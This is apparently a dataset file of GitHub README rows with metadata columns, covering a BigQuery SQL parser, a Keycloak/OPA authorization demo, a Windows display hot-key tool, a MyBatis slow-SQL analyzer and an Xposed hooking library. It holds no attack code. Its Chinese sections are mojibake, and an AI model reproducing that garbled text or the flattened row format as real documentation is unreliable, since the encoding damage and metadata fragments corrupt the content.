- ""bigquery-public-data.samples.shakespeare""
```

### Notes
- This parser **never** accesses the data of the tables or any bigquery instance. The only 
  connection needed is to the metadata of the tables.
- The parser will use a default project+dataset if these are missing in the reference tables of 
  a project. Please refer to `src/main/java/com/borjav/data/options/Options.java` in case you 
  need to set a specific project.
- When using UDFs, they also have to be defined within the code. The parser won't be able to 
  resolve them if they are not defined in the code. Please refer to 
  `src/test/resources/sql/benchmark/udf.yaml`.
",0,1,1,0.0,"['what', 'parser', 'do', 'what', 'ca', 'do', 'how', 'use', 'example', 'note']","['what', 'do', 'parser', 'ca', 'how']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-shade-plugin,org.apache.maven.plugins:maven-surefire-plugin]",0.0,1.0,0.0
thomasdarimont/keycloak-opa-authz-demo,main,"Keycloak Open Policy Integration Demo
----

Example code for integrating Open Policy Agent with Keycloak presented at Keycloak Dev Day 2024.

[Slides](keycloak-devday-2024-flexible-authz-for-keycloak-with-openpolicyagent.pdf)

# Build

```
mvn clean package -DskipTests
```

# Run

## Run with HTTP

Start the docker compose setup with Keycloak, Open Policy Agent, Mail server.

```
docker compose -f dev/docker-compose.yml up
```

## Run with HTTPS

This example uses https://id.kubecon.test:8443/auth as the Keycloak auth server URL.

To use the example with https just add a mapping for `id.kubecon.test` to your `/etc/hosts` file
and regenerate the certificates via the [mkcert](https://github.com/FiloSottile/mkcert) tool first.

Then start the `dev/docker-compose-https.yml` docker compose file.

Â´Â´Â´
(cd dev/config/certs && mkcert -install && mkcert -cert-file kubecon.pem -key-file kubecon-key.pem ""*.kubecon.test"")

docker compose -f dev/docker-compose-https.yml up
Â´Â´Â´

# Demo

Once up, you can access Keycloak via http://localhost:8080/auth and login with `admin/admin`.

The demo contains a realm called `opademo` that is configured via `dev/config/realms/opademo.yaml`
through [keycloak-config-cli](https://github.com/adorsys/keycloak-config-cli).

## Users

The example contains a few users to demonstrate various aspects.

- Username: ""tester"" with Password: ""test""
- Username: ""admin"" with Password: ""test""
- Username: ""guest"" with Password: ""test""

## Clients

The `opademo` realm contains a few client applications to demonstrate various access policies expressed
with the REGO Policy language provided by OpenPolicyAgent. 

## OPA Access Policy

The client access policies are defined in the file `dev/opa/policies/keycloak/realms/opademo/access/policy.rego`. 
For this demo Open Policy Agent is configured to watch the file for changes and will automatically
update the policies on change.

To enable the policy check, go to `opademo Realm` -> `Authentication` -> `Required Actions` -> `Enable: OPA Policy Check`.

## Realm configuration

The realm with the clients, roles, groups and users are defined in the `dev/config/realms/opademo.yaml` 
config file. 

For the demo the `tester` user can be granted more access incrementally by uncommenting the role / group memeber ship mapping in the `opademo.yaml` file.

To apply the changed realm configuration to the running Keycloak instance, just execute the following command:

`docker restart dev-keycloak-provisioning-1`.",0,0,1,1.0,"['build', 'run', 'run', 'http', 'run', 'http', 'demo', 'user', 'client', 'opa', 'access', 'policy', 'realm', 'configuration']","['run', 'http', 'build', 'demo', 'user']",1.0,[],0.0,1.0,0.0
jon-mil-92/DisplayHotKeys,main,"<!-- PROJECT LOGO -->

<a name=""readme-top""></a>
<div align=""center"">
  <a href=""https://github.com/jon-mil-92/DisplayHotKeys"">
    <img src=""src/tray_icon.png"" alt=""Logo"" width=""80"" height=""80"" align=""center"" />
  </a>
  <br/>
  <h3 align=""center"">Display Hot Keys</h3>
  <p align=""center"">
    <i>Effortlessly control display settings!</i>
    <br/>
    <a href=""https://github.com/jon-mil-92/DisplayHotKeys/issues"">Report Bug</a>
    <b>Â·</b>
    <a href=""https://github.com/jon-mil-92/DisplayHotKeys/issues"">Request Feature</a>
    <b>Â·</b>
    <a href=""https://github.com/jon-mil-92/DisplayHotKeys/releases"">Releases</a>
  </p>
</div>

<!-- TABLE OF CONTENTS -->

## Table of Contents
<ol>
  <li><a href=""#about-the-project"">About The Project</a></li>
  <li><a href=""#getting-started"">Getting Started</a></li>
  <li><a href=""#usage"">Usage</a></li>
  <li><a href=""#roadmap"">Roadmap</a></li>
  <li><a href=""#license"">License</a></li>
  <li><a href=""#contact"">Contact</a></li>
  <li><a href=""#dependencies"">Dependencies</a></li>
</ol>

<!-- ABOUT THE PROJECT -->

## About The Project

This project was created to circumvent the tedious navigation of the Windows settings menus to change display settings. With Display Hot Keys, the display resolution, bit depth, refresh rate, scaling mode, and DPI scale percentage can be changed for each connected display with user-defined hot keys.

### Common Use Cases

* Switch refresh rates to quickly enable the Black Frame Insertion or Backlight Strobing capabilities of the display.

* Quickly switch between resolutions with different aspect ratios.

* Immediately apply a resolution without entering the in-game menus for video game benchmarking purposes.

* Enlarge or shrink the elements on screen by instantly changing the DPI scale percentage.

* Instantly set a display mode while in a video game. (This is useful if a video game does not support changing the resolution or refresh rate while in-game.)

### Example Screen (v1.4.0)

![screenshot](product-screenshot.png)

<p align=""right""><a href=""#readme-top"">Back to Top</a>&thinsp; &#x25B2;</p>

<!-- GETTING STARTED -->

## Getting Started

This application was made only for the Windows platform. Display Hot Keys also uses elevated privileges to set display modes while in video games. Therefore, if you have UAC enabled, you will get a UAC prompt upon launching the application. If you no longer wish to see this prompt, you can [disable UAC]. The sections that follow will help you get the application up and running on your PC!

### Prerequisites

* Windows 10 x64 or Windows 11 x64 operating system.

* If using multiple displays, then the ""Multiple displays"" setting must be set to ""Extend these displays"" in the Windows ""Display"" settings menu!

### Installation

This application will be distributed as a portable package and as an installer.

#### Portable

1. Download the zip archive.

2. Unzip the archive.

3. Double-click the DisplayHotKeys executable file or create a shortcut to run the application.

#### Installer

1. Download the installer.

2. Run the installer.

3. Follow the installer prompts.

4. Double-click the created shortcut or the DisplayHotKeys executable file in the install directory to run the application.

<p align=""right""><a href=""#readme-top"">Back to Top</a>&thinsp; &#x25B2;</p>

<!-- USAGE -->

## Usage

This application will launch minimized to the system tray in the task bar by design.

### Setting Hot Keys

1. Click the ""Change Hot Key"" button.

2. Press the key combination for the hot key. (Up to three keys can be used!)

3. Release at least one of the keys to set the hot key.

**Note:** A hot key cannot be a subset of another hot key. For example, you cannot have a hot key of ""Ctrl + F1"" and another hot key of ""Ctrl + Shift + F1"". However, a hot key can be the same as another hot key if they are for different displays. This will allow you to apply display settings for multiple displays with one hot key!

### Changing Displays

1. Click the ""Display"" drop-down box.

2. Select the display you want to change hot keys for.

**Note:** The application will automatically detect newly disconnected and connected displays, and the application will refresh to reflect the display configuration change.

### Changing Active Hot Key Slots

1. Click the ""Slots"" drop-down box.

2. Select one of the values.

**Note:** There can be up to 12 active hot key slots for each connected display.

### Changing Display Orientation (Coming in v1.4.0)

1. Click the ""Orientation"" drop-down box.

2. Select one of the following values:
    
    * Landscape - The standard orientation with no rotation.
    
    * Portrait - Mode for 90 degrees display rotation.
    
    * iLandscape - Inverted landscape mode for 180 degrees display rotation.
    
    * iPortrait - Inverted portrait mode for 270 degrees display rotation.

**Note:** Make sure you can rotate your display before changing the orientation; otherwise, it may be difficult to operate your computer.

### Selecting Display Settings

1. Select a display mode value in the ""Display Mode"" drop-down box for the hot key slot.

2. Select a scaling mode value in the ""Scaling Mode"" drop-down box for the hot key slot.

	* Select ""Preserved"" to preserve the aspect ratio of the image.
	
	* Select ""Stretched"" to stretch the image to the edges of the panel.
	
	* Select ""Centered"" to center the image in the middle of the panel.

3. Select a DPI scale percentage value in the ""DPI Scale"" drop-down box for the hot key slot.

**Note:** You may need to use GPU Scaling in your display driver settings to prevent the monitor from overriding the scaling mode.

### Button Interaction

#### Apply Display Mode (Coming in v1.4.0)

The display settings can be immediately applied by clicking on the ""Apply Display Mode"" button for a hot key slot.

#### Clear Hot Key

Individual hot keys can be cleared by clicking on the ""Clear Hot Key"" button for a hot key slot when a hot key is set.

#### PayPal Donate

If you find the application useful and wish to donate, there is a ""PayPal Donate"" button that will open a PayPal donation web page.

#### Change Theme

The theme can be changed between ""Light Mode"" and ""Dark Mode"" by clicking on the ""Change Theme"" button. The icon will change to indicate the current theme.

#### Run On Startup

The application can start automatically when the user logs into Windows by clicking on the ""Run On Startup"" button. The arrow will turn green to indicate that this option is enabled. The application will start minimized to the system tray.

#### Refresh App

If you have created a custom display mode while the application is running, there is a ""Refresh App"" button that will refresh the application to reflect the new display mode.

#### Clear All Slots

All hot key slots for the selected display can be reset by clicking on the ""Clear All Slots"" button.

#### Minimize To Tray

The application will be minimized to the system tray when the ""Minimize To Tray"" button is pressed. To restore the application, click the system tray icon and select ""Restore"".

#### Exit App

To exit the application, click on the ""Exit App"" button. You can also exit the application from the system tray by clicking on the system tray icon and selecting ""Exit"".

<p align=""right""><a href=""#readme-top"">Back to Top</a>&thinsp; &#x25B2;</p>

<!-- ROADMAP -->

## Roadmap

- [x] &thinsp; Release the initial build.
- [x] &thinsp; Add scaling mode selection.
- [x] &thinsp; Add multi-monitor support.
- [x] &thinsp; Add display orientation selection.
- [x] &thinsp; Add button to immediately apply display modes.

See [open issues] for a full list of proposed features (and known issues).

<p align=""right""><a href=""#readme-top"">Back to Top</a>&thinsp; &#x25B2;</p>

<!-- LICENSE -->

## License

Distributed under the [MIT License]. See LICENSE.txt for more information.

<p align=""right""><a href=""#readme-top"">Back to Top</a>&thinsp; &#x25B2;</p>

<!-- CONTACT -->

## Contact

Jonathan Miller - jonRock1992@gmail.com

<p align=""right""><a href=""#readme-top"">Back to Top</a>&thinsp; &#x25B2;</p>

<!-- DEPENDENCIES -->

## Dependencies

* [Java (low-level) System Hook] <b>Â·</b> [MIT License]

* [FlatLaf - Flat Look and Feel] <b>Â·</b> [Apache License 2.0]

* [Material Design Icons] <b>Â·</b> [Apache License 2.0]

* [PayPal Donate Button] <b>Â·</b> [AGPL License 3.0]

* [SystemTray] <b>Â·</b> [Apache License 2.0]

* [Ini4j] <b>Â·</b> [Apache License 2.0]

* [Apache Maven Assembly Plugin] <b>Â·</b> [Apache License 2.0]

* [Maven Compiler Plugin] <b>Â·</b> [Apache License 2.0]

Distribution made possible with the following tools:

* [launch4j]

* [Inno Setup]

<p align=""right""><a href=""#readme-top"">Back to Top</a>&thinsp; &#x25B2;</p>

<!-- PAYPAL DONATE -->

**Disclaimer:** Development of Display Hot Keys is not contingent on donations. PayPal is a registered trademark of PayPal, Inc. The PayPal logo is a trademark of PayPal, Inc.

<div align=""left"">
  <a href=""https://www.paypal.com/donate/?business=A6U7KG5BDZTRE&no_recurring=0&item_name=I+appreciate+you+visiting+this+page%21+Thank+you%21&currency_code=USD"">
    <img src=""https://raw.githubusercontent.com/stefan-niedermann/paypal-donate-button/master/paypal-donate-button.png"" align=""left"" height=""72""/>
  </a>
</div>
<br/>
<br/>
<br/>

<!-- MARKDOWN LINKS -->

[disable UAC]: https://pureinfotech.com/disable-user-account-control-uac-windows-11/
[open issues]: https://github.com/jon-mil-92/DisplayHotKeys/issues
[Java (low-level) System Hook]: https://github.com/kristian/system-hook
[FlatLaf - Flat Look and Feel]: https://github.com/JFormDesigner/FlatLaf
[Material Design Icons]: https://github.com/marella/material-design-icons
[PayPal Donate Button]: https://github.com/stefan-niedermann/paypal-donate-button
[SystemTray]: https://github.com/dorkbox/SystemTray
[Ini4j]: https://ini4j.sourceforge.net/
[Apache Maven Assembly Plugin]: https://maven.apache.org/plugins/maven-assembly-plugin/index.html
[Maven Compiler Plugin]: https://maven.apache.org/plugins/maven-compiler-plugin/index.html
[launch4j]: https://launch4j.sourceforge.net/index.html
[Inno Setup]: https://jrsoftware.org/isinfo.php
[MIT License]: https://mit-license.org
[Apache License 2.0]: https://www.apache.org/licenses/LICENSE-2.0
[AGPL License 3.0]: https://www.gnu.org/licenses/agpl-3.0.en.html
",7,0,1,0.0,"['table', 'content', 'about', 'the', 'project', 'common', 'use', 'case', 'example', 'screen', 'get', 'start', 'prerequisite', 'installation', 'portable', 'installer', 'usage', 'set', 'hot', 'key', 'change', 'display', 'change', 'active', 'hot', 'key', 'slot', 'change', 'display', 'orientation', 'coming', 'select', 'display', 'setting', 'button', 'interaction', 'apply', 'display', 'mode', 'coming', 'clear', 'hot', 'key', 'paypal', 'donate', 'change', 'theme', 'run', 'on', 'startup', 'refresh', 'app', 'clear', 'all', 'slot', 'minimize', 'to', 'tray', 'exit', 'app', 'roadmap', 'license', 'contact', 'dependency']","['change', 'display', 'hot', 'key', 'slot']",1.0,"[maven-compiler-plugin,org.apache.maven.plugins:maven-assembly-plugin]",0.0,1.0,0.0
lhccong/sql-slow-mirror,master,"<p align=""center"">
    <a href="""" target=""_blank"">
      <img src=""./docs/imgs/icon.jpg"" width=""280"" />
    </a>
</p>
<h1 align=""center"">SQL æ…¢é•œ - SQLSlowMirror</h1>
<p align=""center""><strong>ä¸€ä¸ªæ—¨åœ¨å¸®åŠ©ç³»ç»Ÿå¿«é€Ÿåˆ†ææ…¢ SQL çš„å·¥å…·ã€‚<br>æ— è®ºä½ æ˜¯å¼€å‘è€…è¿˜æ˜¯è¿ç»´äººå‘˜ï¼ŒSQL æ…¢é•œéƒ½å°†æˆä¸ºä½ çš„æœ€ä½³ä¼™ä¼´ã€‚<em>æŒç»­æ›´æ–°ä¸­ï½</em></strong></p>
<div align=""center"">
    <a href=""""><img src=""https://img.shields.io/badge/github-é¡¹ç›®åœ°å€-yellow.svg?style=plasticr""></a>
    <a href=""""><img src=""https://img.shields.io/badge/å‰ç«¯-é¡¹ç›®åœ°å€-blueviolet.svg?style=plasticr""></a>
</div>



## èƒŒæ™¯

å¤§ä¿ƒå¤‡æˆ˜ï¼Œæœ€å¤§çš„éšæ‚£é¡¹ä¹‹ä¸€å°±æ˜¯æ…¢ SQLï¼Œå¸¦æ¥çš„ç ´åæ€§æœ€å¤§ï¼Œä¹Ÿæ˜¯æ—¥å¸¸å·¥ä½œä¸­ç»å¸¸å¸¦æ¥æ•´ä¸ªåº”ç”¨æŠ–åŠ¨çš„æœ€å¤§éšæ‚£ï¼Œè€Œä¸”å¯¹ SQL å¥½åçš„è¯„ä¼°æœ‰ä¸€å®šçš„æŠ€æœ¯è¦æ±‚ï¼Œæœ‰ä¸€äº›ç¼ºä¹ç»éªŒæˆ–è€…å› ä¸ºä¸å¤Ÿä»”ç»†é€ æˆä¸€ä¸ªåçš„ SQL æˆåŠŸèµ°åˆ°äº†çº¿ä¸Šï¼Œç­‰å‘ç°çš„æ—¶å€™è¦ä¹ˆæ˜¯é€ æˆäº†çº¿ä¸Šå½±å“ã€æŠ¥è­¦ã€æˆ–è€…åç½®çš„æ…¢ SQL é‡‡é›†å‘ç°ï¼Œè¿™æ—¶å€™ä¸€èˆ¬æ— æ³•å¿«é€Ÿæ­¢æŸï¼Œéœ€è¦ä¿®æ”¹ä»£ç ä¸Šçº¿ã€æˆ–è€…è°ƒæ•´æ•°æ®åº“ç´¢å¼•ã€‚

1ã€æ— æ³•æå‰å‘ç°æ…¢ SQLï¼Œå¯èƒ½æ¶åŒ–ä¸ºæ…¢ SQL çš„è¯­å¥

2ã€çº¿ä¸Šå‡ºç°æ…¢ SQL åï¼Œæ— æ³•å¿«é€Ÿæ­¢æŸ



é¡¹ç›®å‚è€ƒäº†äº¬ä¸œå¼€æºé¡¹ç›®ï¼š**[sql-analysis](https://github.com/jd-opensource/sql-analysis)**



## åŠŸèƒ½&è®¾è®¡ğŸš€

![sqlPic](docs/imgs/sqlPic.png)

```txt
sql-slow-mirror-core SQL æ…¢é•œç»„ä»¶æ ¸å¿ƒä»£ç 
â”œâ”€analysis	--SQLæ‰§è¡Œåˆ†ææ¨¡å—
â”œâ”€config	--é…ç½®æ–‡ä»¶çš„å­˜æ”¾
â”œâ”€core	--è´Ÿè´£ç»„ä»¶çš„æ¥å…¥åˆ° mybatis ä»¥åŠæµç¨‹è°ƒç”¨
â”œâ”€extract	--è´Ÿè´£å®Œæ•´ SQL çš„æå–æ¨¡å—
â”œâ”€out	--è¾“å‡ºç»“æœæ¨¡å—
â”œâ”€rule	--è§„åˆ™å¼•æ“æ‰§è¡Œæ¨¡å—
â”œâ”€utils	--å·¥å…·ç±»å­˜æ”¾æ¨¡å—
â””â”€score	--è¯„åˆ†æ¨¡å—

sql-slow-mirror-sample --[ç¤ºä¾‹]ç¤ºä¾‹ demo å¯ç›´æ¥ä½¿ç”¨
```

### åŠŸèƒ½ï¼š

1. å¯¹ Mybatis ä¸­çš„æ‰§è¡Œ SQL è§£æ
2. åˆ†æ SQL çš„æ‰§è¡Œè®¡åˆ’
3. é€šè¿‡è§„åˆ™å¼•æ“å°†æ‰§è¡Œè®¡åˆ’è¿›è¡Œè§£æå¹¶è¾“å‡º

## å¿«é€Ÿå¼€å§‹ğŸŒˆ

### å¯åŠ¨ç¤ºä¾‹

**æ–¹å¼ä¸€**ï¼šä½¿ç”¨æœ¬é¡¹ç›®ä¸­çš„æµ‹è¯•ç”¨ä¾‹

1. å°†é¡¹ç›®å…‹éš†åˆ°æœ¬åœ°

   ```
   git clone https://github.com/lhccong/sql-slow-mirror
   ```

2. IDEAæ‰“å¼€é¡¹ç›®

   ä½¿ç”¨ IDEA æ‰“å¼€ï¼Œç­‰å¾…é¡¹ç›®åˆå§‹åŒ–å®Œæˆã€‚

3. æ‰§è¡Œ sql-analysis-samples é¡¹ç›®ä¸­çš„æµ‹è¯•ç”¨ä¾‹ï¼ŒæŸ¥çœ‹æ§åˆ¶å°è¾“å‡ºçš„åˆ†ææ—¥å¿—

![image-20240416162922123](docs/imgs/sqlAnalysis.png)



### ä½¿ç”¨æ–¹æ³•

#### 1ã€å¼•å…¥ä¾èµ–

```xml
<dependency>
    <groupId>com.cong.sql.slow.mirror</groupId>
    <artifactId>sql-slow-mirror-core</artifactId>
    <version>1.0-SNAPSHOT</version>
</dependency>
```

#### 2ã€é…ç½® yml

```yml
spring:
  datasource:
    driver-class-name: com.mysql.cj.jdbc.Driver
    url: jdbc:mysql://localhost:3306/éœ€è¦åˆ†æçš„æ•°æ®åº“?useSSL=false&useUnicode=true&characterEncoding=utf-8&serverTimezone=Asia/Shanghai&allowPublicKeyRetrieval=true
    username: root
    password: root
sql:
   slow:
      mirror:
         analysisSwitch: true #æ˜¯å¦å¼€å¯ SQL åˆ†æ
#         onlyCheckOnce: true  #æ˜¯å¦åªåˆ†æä¸€æ¬¡
#         checkInterval: 300000  #åˆ†æé—´éš” åªæœ‰ onlyCheckOnce ä¸º false çš„æ—¶å€™æ‰æœ‰æ•ˆ
#         exceptSqlIds: com.cong.example.mapper.TaskMapper.selectList,com.cong.example.mapper.TaskMapper.xxx #ä¸éœ€è¦åˆ†æçš„ SQL ID
#         sqlType: SELECT,UPDATE #æ‹¦æˆªçš„ SQL ç±»å‹
#         outModel: LOG #æ—¥å¿—æ¨¡å‹ é»˜è®¤å°±æ˜¯ç³»ç»Ÿçš„ log æ‰“å°
#         outputClass: com.cong.example.out.MySqlScoreResultOutService #è¦è‡ªå®šä¹‰è¾“å‡ºçš„æ—¶å€™å†æ‰“å¼€
```

|                |                                            |          |                    |                             |
| -------------- | ------------------------------------------ | -------- | ------------------ | --------------------------- |
| å±æ€§           | ç”¨é€”                                       | æ˜¯å¦å¿…å¡« | é»˜è®¤å€¼             | å¤‡æ³¨                        |
| analysisSwitch | æ˜¯å¦å¼€å¯åˆ†æåŠŸèƒ½                           | æ˜¯       | false              |                             |
| onlyCheckOnce  | æ˜¯å¦å¯¹ä¸€ä¸ªsqlidåªåˆ†æä¸€æ¬¡                  | é       | true               |                             |
| checkInterval  | æ¯ä¸ªsqlidåˆ†æé—´éš”                          | é       | 300000æ¯«ç§’         | onlyCheckOnce ä¸ºfalseæ‰ç”Ÿæ•ˆ |
| exceptSqlIds   | éœ€è¦è¿‡æ»¤ä¸åˆ†æçš„sqlid                      | é       |                    |                             |
| sqlType        | åˆ†æçš„sqlç±»å‹                              | é       | é»˜è®¤ SELECT,UPDATE |                             |
| outModel       | é»˜è®¤è¾“å‡ºæ–¹å¼                               | é       | é»˜è®¤å€¼ï¼šLOG        |                             |
| outputClass    | è¯„åˆ†ç»“æœè¾“å‡ºç±»ï¼Œç”¨äºæ‰©å±•è‡ªå®šä¹‰ç»“æœè¾“å‡ºæ–¹å¼ | é       |                    |                             |

#### 3ã€æ³¨å…¥å®¹å™¨

```java
package com.cong.example.config;

import com.cong.sql.slowmirror.config.ConfigUtils;
import com.cong.sql.slowmirror.core.SqlAnalysisAspect;
import org.mybatis.spring.annotation.MapperScan;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

import java.util.Properties;

/**
 * MyBatis Plus é…ç½®
 *
 * @author <a href=""https://github.com/lhccong"">...</a>
 */
@Configuration
@MapperScan(""com.cong.example.mapper"")
public class MyBatisPlusConfig {

    /**
     * SQLåˆ†ææ–¹é¢
     *
     * @return {@link SqlAnalysisAspect}
     */
    @Bean
    public SqlAnalysisAspect sqlAnalysisAspect() {

        // åŠ è½½é…ç½®æ–‡ä»¶ï¼Œæ­¤å¤„åŠ è½½çš„æ˜¯åä¸º""sql.slow.mirror""çš„é…ç½®
        Properties properties = ConfigUtils.loadConfig(""sql.slow.mirror"");

        // åˆ›å»ºSQLåˆ†æåˆ‡é¢çš„å®ä¾‹
        SqlAnalysisAspect sqlAnalysisAspect = new SqlAnalysisAspect();

        // å°†åŠ è½½çš„é…ç½®å±æ€§è®¾ç½®åˆ°SQLåˆ†æåˆ‡é¢å®ä¾‹ä¸­
        sqlAnalysisAspect.setProperties(properties);

        // è¿”å›é…ç½®å®Œæ¯•çš„SQLåˆ†æåˆ‡é¢å®ä¾‹
        return sqlAnalysisAspect;
    }



```

## ä¼˜åŠ¿

1. æ¥å…¥æˆæœ¬ä½ï¼šåªéœ€è¦è®¾ç½®å¥½é…ç½®æ–‡ä»¶
2. å¯æ‰©å±•æ€§å¥½ï¼šèƒ½å¤Ÿé€šè¿‡è‡ªå®šä¹‰çš„æ–¹å¼æ¥åˆ¶å®šåˆ†æç»“æœçš„è¾“å‡º
3. æ€§èƒ½ï¼šåŸºäºæ€§èƒ½å’Œä¸åŒçš„ä½¿ç”¨åœºæ™¯è€ƒè™‘ï¼Œæ”¯æŒå®šåˆ¶åŒ–é…ç½®ï¼Œæ¯ä¸ª SQL æ˜¯å¦ä»…è¿›è¡Œä¸€æ¬¡æ£€æŸ¥ã€æˆ–è€…æŒ‰æŸä¸ªæ—¶é—´é—´éš”è¿›è¡Œé…ç½®

### è´¡çŒ®è€…

- [èª](https://github.com/lhccong) - ä¸»è¦å¼€å‘è€…

### è®¸å¯è¯

è¯¥é¡¹ç›®é‡‡ç”¨ MIT è®¸å¯è¯ã€‚è¯¦ç»†ä¿¡æ¯è¯·å‚é˜… [LICENSE](LICENSE) æ–‡ä»¶ã€‚

### è”ç³»æ–¹å¼

å¦‚æœ‰ä»»ä½•ç–‘é—®æˆ–å»ºè®®ï¼Œæ¬¢è¿è”ç³»é¡¹ç›®ä¸»è¦å¼€å‘è€…ï¼š

- ç”µå­é‚®ä»¶: 771901874@qq.com

### æ³¨æ„äº‹é¡¹

- æœ¬é¡¹ç›®ä»…ä¾›å­¦ä¹ å’Œå‚è€ƒä½¿ç”¨ï¼Œæœªç»æˆæƒè¯·å‹¿ç”¨äºå•†ä¸šç›®çš„ã€‚
- æ¬¢è¿è´¡çŒ®ä»£ç æˆ–è€…æå‡ºå»ºè®®ï¼Œæ‚¨å¯ä»¥é€šè¿‡æå‡º Issue æˆ–è€… Pull Request çš„æ–¹å¼å‚ä¸åˆ°é¡¹ç›®ä¸­æ¥ã€‚

## å‚ä¸è´¡çŒ®

å¦‚æœæ‚¨å¯¹é¡¹ç›®æœ‰ä»»ä½•å»ºè®®æˆ–æƒ³è¦è´¡çŒ®ä»£ç ï¼Œæ¬¢è¿æäº¤ Issue æˆ– Pull Requestã€‚æˆ‘ä»¬æœŸå¾…æ‚¨çš„å‚ä¸ï¼Œå…±åŒå®Œå–„å’Œæ”¹è¿› SQL æ…¢é•œé¡¹ç›®ï¼

---

æ„Ÿè°¢æ‚¨å¯¹ SQL æ…¢é•œé¡¹ç›®çš„å…³æ³¨å’Œæ”¯æŒï¼ğŸ•µï¸â€â™€ï¸",0,0,2,1.0,"['yml', 'onlycheckonce', 'true', 'checkinterval', 'onlycheckonce', 'false', 'exceptsqlids', 'sql', 'id', 'sqltype', 'select', 'update', 'sql', 'outmodel', 'log', 'log', 'outputclass']","['onlycheckonce', 'sql', 'log', 'yml', 'true']",3.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,2.0,1.0
HChenX/HookTool,master,"<div align=""center"">
<h1>HookTool</h1>

![stars](https://img.shields.io/github/stars/HChenX/HookTool?style=flat)
![Github repo size](https://img.shields.io/github/repo-size/HChenX/HookTool)
[![GitHub release (latest by date)](https://img.shields.io/github/v/release/HChenX/HookTool)](https://github.com/HChenX/HookTool/releases)
[![GitHub Release Date](https://img.shields.io/github/release-date/HChenX/HookTool)](https://github.com/HChenX/HookTool/releases)
![last commit](https://img.shields.io/github/last-commit/HChenX/HookTool?style=flat)
![language](https://img.shields.io/badge/language-java-purple)

<p><b><a href=""README-en.md"">English</a> | <a href=""README.md"">ç®€ä½“ä¸­æ–‡</a></b></p>
<p>Java ç‰ˆ Hook å·¥å…·ï¼</p>
</div>

# âœ¨ å·¥å…·äº®ç‚¹

### 1. **é“¾å¼è°ƒç”¨**

### 2. **æ³›å‹è½¬æ¢**

### 3. **å…¨é¢ä¸°å¯Œ**

#### Tip: é‡æ„å£°æ˜: v.1.0.0 ç‰ˆæœ¬å’Œä¹‹å‰ç‰ˆæœ¬æœ‰è¾ƒå¤§ä¸åŒï¼Œæ–°ç‰ˆæœ¬å·¥å…·å®Œæˆé™æ€åŒ–ï¼Œæ›´ç¬¦åˆå·¥å…·ç‰¹å¾ï¼Œæ‹¥æœ‰æ›´å¥½çš„ä½¿ç”¨ä½“éªŒå’Œæ€§èƒ½ã€‚

# ğŸ”§ ä½¿ç”¨æ–¹æ³•

#### 1. å‘é¡¹ç›® settings.gradle æ–‡ä»¶æ·»åŠ å¦‚ä¸‹ä»£ç ã€‚

```groovy
dependencyResolutionManagement {
    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
    repositories {
        mavenCentral()
        maven { url 'https://jitpack.io' }
    }
}
```

#### 2. å‘é¡¹ç›® app å†… build.gradle æ–‡ä»¶æ·»åŠ å¦‚ä¸‹ä»£ç ã€‚

```groovy
dependencies {
    // jitpack
    implementation 'com.github.HChenX:HookTool:v.1.0.4'
    // maven
    implementation 'io.github.hchenx:hooktool:v.1.0.4'
    // äºŒé€‰ä¸€å³å¯
}
```

#### 3. åŒæ­¥é¡¹ç›®ï¼Œä¸‹è½½ä¾èµ–å³å¯åœ¨ä»£ç å†…è°ƒç”¨ã€‚

#### 4. ä½¿ç”¨å·¥å…·ã€‚

- HCInit ä»‹ç»ã€‚

```java
public void init() {
    HCinit.initBasicData(); // åˆå§‹åŒ–æ¨¡å—åŸºæœ¬ä¿¡æ¯
    HCinit.initStartupParam(); // åœ¨ zygote é˜¶æ®µåˆå§‹åŒ–å·¥å…·
    HCinit.initLoadPackageParam(); // åœ¨ loadPackage é˜¶æ®µåˆå§‹åŒ–å·¥å…·
    HCinit.xPrefsAutoReload(); // æ˜¯å¦è‡ªåŠ¨æ›´æ–°å…±äº«é¦–é€‰é¡¹ï¼Œé»˜è®¤å¼€å¯
    HCinit.useLogExpand(); // æ˜¯å¦ä½¿ç”¨æ—¥å¿—å¢å¼ºåŠŸèƒ½ï¼Œå…·ä½“å‚è§æ–¹æ³•æ³¨è§£
}
```

- åœ¨ Xposed å…¥å£å¤„åˆå§‹åŒ–æœ¬å·¥å…·ã€‚

```java

@Override
public void initZygote(IXposedHookZygoteInit.StartupParam startupParam) {
    HCInit.initBasicData(new BasicData()
            .setModulePackageName(""com.hchen.demo"") // æ¨¡å—åŒ…å
            .setTag(""HChenDemo"") // æ—¥å¿— tag
            .setLogLevel(LOG_D) // æ—¥å¿—ç­‰çº§
            .setPrefsName(""hchen_prefs"") // prefs å­˜å‚¨æ–‡ä»¶å
    ); // è‹¥æœ‰ initZygote å»ºè®®é…ç½®åœ¨è¿™é‡Œï¼Œå› ä¸ºæ—¶æœºå¾ˆæ—©ã€‚
    HCInit.initStartupParam(startupParam); // åœ¨ zygote é˜¶æ®µåˆå§‹åŒ–å·¥å…·
}

@Override
public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) {
    HCInit.initLoadPackageParam(lpparam); // åœ¨ loadPackage é˜¶æ®µåˆå§‹åŒ–å·¥å…·
}
```

- å¦‚æœéœ€è¦ä½¿ç”¨ prefs å·¥å…·æˆ–è€…åœ¨æ¨¡å—å†…ä½¿ç”¨æœ¬å·¥å…·çš„ log ç±»ï¼Œé‚£ä¹ˆä½ è¿˜éœ€è¦åœ¨æ¨¡å—ä¸»ç•Œé¢åˆå§‹åŒ–ã€‚

```java
public static class MainActivity {
    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        HCInit.initBasicData(new BasicData()
                .setModulePackageName(""com.hchen.demo"") // æ¨¡å—åŒ…å
                .setTag(""HChenDemo"") // æ—¥å¿— tag
                .setLogLevel(LOG_D) // æ—¥å¿—ç­‰çº§
                .setPrefsName(""hchen_prefs"") // prefs å­˜å‚¨æ–‡ä»¶åã€‚Tip: è¯·ä¿æŒæ–‡ä»¶åä¸€è‡´ã€‚
        );
    }
}
```

- åœ¨ä»£ç å¤„è°ƒç”¨

```java
public class MainTest {
    public void test() {
        CoreTool.hook(/* å†…å®¹ */); // å³å¯ hook
        CoreTool.findClass(); // æŸ¥æ‰¾ç±»
        CoreTool.callMethod(); // è°ƒç”¨æ–¹æ³•
        ChainTool.chain(""com.hchen.demo"", new ChainTool()
                .method(""method"")
                .hook()

                .method(""method"")
                .hook()
